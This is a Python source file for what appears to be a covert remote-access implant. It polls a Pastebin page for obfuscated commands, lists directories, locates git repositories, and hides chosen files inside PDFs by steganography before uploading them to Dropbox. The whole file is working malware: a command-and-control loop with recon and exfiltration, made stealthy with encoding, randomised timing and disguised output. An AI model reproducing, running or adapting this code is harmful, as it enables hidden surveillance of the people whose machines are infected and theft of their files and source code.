import base64
import requests
import subprocess
import os
import os.path

import bwt

import time
import random

import dropbox

from io import StringIO
import traceback

# For both of these, throw away the stdout+stderr
def assemble_pdf_data(data: bytes, key: str, output_name: str):
    temp_file_name = f"/tmp/{random.randint(1000000, 9999999)}"
    try:
        with open(temp_file_name, "wb") as data_fil:
            data_fil.write(data)
            data_fil.flush()
            # This only works on Unix-like systems
            hide_result = subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name,
                "-k", key, "embed", data_fil.name, "./pdf_base.pdf"], capture_output=True)
            if hide_result.returncode != 0:
                print(hide_result.stderr)
    finally:
        os.unlink(temp_file_name)


def assemble_pdf_path(path: str, key: str, output_name: str):
    hide_result = subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name,
        "-k", key, "embed", path, "./pdf_base.pdf"], capture_output=True)
    if hide_result.returncode != 0:
        print(hide_result.stderr)

def upload_file(dbx, file_path: str):
    with open(file_path, "rb") as fil:
        fil_dat = fil.read()
    dbx.files_upload(fil_dat, file_path[1:], dropbox.files.WriteMode.add)

def main():
    # TODO: load from a file
    cmd_url = "https://pastebin.com/raw/GwC3FJeB"
    while True:
        time.sleep(1)
        cmd = requests.get(cmd_url)
        if cmd.ok:
            ctr_count = 0
        else:
            ctr_count += 1
            if ctr_count >= 3:
                # TODO: self-destruct
                pass
            else:
                time.sleep(60+10*random.random())
                continue

        cmd_text = base64.b64decode(bytes(bwt.ibwt(cmd.text), "ascii")).decode("utf8")

        output_collation = list()
        upload_list=list()
        current_time = time.time_ns()
        token = None

        try:
            for line in cmd_text.split("\n"):
                if len(line) == 0:
                    continue

                output_collation.append(f"> {repr(line)}")
                output_string = "# "
                if line.startswith("url "):
                    new_slug = line[len("url "):]
                    new_cmd_url = f"https://pastebin.com/raw/{new_slug}"
                    if not requests.head(new_cmd_url).ok:
                        output_string += "HEAD to new URL failed"
                    else:
                        cmd_url = new_cmd_url
                        # TODO: write to file
                elif line.startswith("list "):
                    path = line[len("list "):]
                    ls_cmd = ["ls", "-a", "-l", os.path.expanduser(path)]
                    ls_out = subprocess.run(ls_cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    output_string += ls_out.stdout + "\n"
                    output_string += f"Exit code {ls_out.returncode}"
                elif line.startswith("find git "):
                    path = line[len("find git "):]
                    find_cmd = ["find", os.path.expanduser(path), "-name", ".git", "-print", "-execdir", "sh", "-c", "git status", ";"]
                    find_out = subprocess.run(find_cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    output_string += find_out.stdout + "\n"
                    output_string += f"Exit code {find_out.returncode}"
                elif line.startswith("upload "):
                    path = line[len("upload "):]
                    path = os.path.expanduser(path)
                    if os.path.exists(path):
                        output_string += f"Uploading as {current_time}_{len(upload_list)}.pdf"
                        upload_list.append(os.path.expanduser(path))
                    else:
                        output_string += f"File {path} does not exist"
                elif line.startswith("token "):
                    token = line[len("token "):]
                    output_collation[-1] = "token [REDACTED]"
                else:
                    output_string += "Command not recognized"
                output_collation.append(output_string)
        except Exception as e:
            with StringIO() as fil:
                traceback.print_exc(file=fil)
                output_string+=f"Internal error: {fil.getvalue()}"
            output_collation.append(output_string)
        ret_val = '\n'.join(output_collation)
        ret_val += '\n'
        #print(ret_val)

        try:
            dbx = dropbox.Dropbox(token)
            output_path = f"./{current_time}.pdf"
            assemble_pdf_data(bytes(ret_val, "utf8"), str(current_time), output_path)
            upload_file(dbx, output_path)
            os.unlink(output_path)

            for i, path in enumerate(upload_list):
                output_path = f"./{current_time}_{i}.pdf"
                assemble_pdf_path(path, str(current_time), output_path)
                upload_file(dbx, output_path)
                os.unlink(output_path)
        except Exception as e:
            traceback.print_exc()
        finally:
            output_path = f"./{current_time}.pdf"
            if os.path.exists(output_path):
                os.unlink(output_path)
            for i, path in enumerate(upload_list):
                output_path = f"./{current_time}_{i}.pdf"
                if os.path.exists(output_path):
                    os.unlink(output_path)

        time.sleep(60+10*random.random())

if __name__ == "__main__":
    main()
